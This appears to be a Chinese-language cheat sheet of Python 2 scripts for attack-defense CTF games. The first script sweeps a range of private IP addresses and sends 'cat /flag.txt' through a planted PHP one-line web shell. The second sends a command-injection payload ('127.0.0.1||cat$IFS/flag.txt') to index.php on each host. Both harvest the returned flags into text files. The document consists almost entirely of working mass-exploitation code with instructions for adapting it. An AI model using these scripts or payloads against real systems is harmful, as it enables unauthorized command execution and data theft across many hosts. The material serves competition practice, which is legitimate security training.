# 注意，所有脚本都是基于python2的，一定要学习Python2脚本
# 一句话木马脚本(看好是post还是get,如果是get自己修改下面命令注入的脚本)
```python
import requests
import re
requests.adapters.DEFAULT_RETRIES = 1
url="http://172.20."         #ip地址，如果是1.1.1.1,1.1.2.1请使用这个，然后根据网段自行修改自行修改
urll=".102/shell.php"          #如果不是index.php请自行修改为一句话木马的地址
payload={"shell":"system('cat /flag.txt');"}     #a为一句话木马，请自行修改
for i in range(101,109):                   #从192.168.1.1-192.168.10.1,请根据靶机ip自行修改
    print(url+str(i)+urll)
    i=str(i)
    cc=url+i
    cc=cc+urll
    a=requests.post(url=cc,data=payload).text
    b=re.findall(r'\w{16,32}',a)    #正则表达式，表示查找数字和字母还有下划线，16位到32位的
    if len(b)>0:
        for j in b:
            f=open('2.txt','a+')    #输出至2.txt,可以自行修改
            f.write(url+i+".1 "+j+'\n')
#切记，如果遇到有ip卡顿请手动修改for循环中的ip地址，例如到3卡顿，请手动修改跳过3，修改为(4-10)
```
# 命令注入与文件包含通用脚本(根据漏洞自行修改)
```python
import requests
import re
url="172.20.10."
urll="/index.php?abc=127.0.0.1||cat$IFS/flag.txt"
for i in range(1,10):
    i=str(i)
    a=requests.get(url=url+i+urll).text
    b=re.findall(r'flag{.*}', a)
    if(len(b)>0):
        for j in b:
            f=open('1.txt','a+')
            f.write(url+i+" "+j+'\n')
```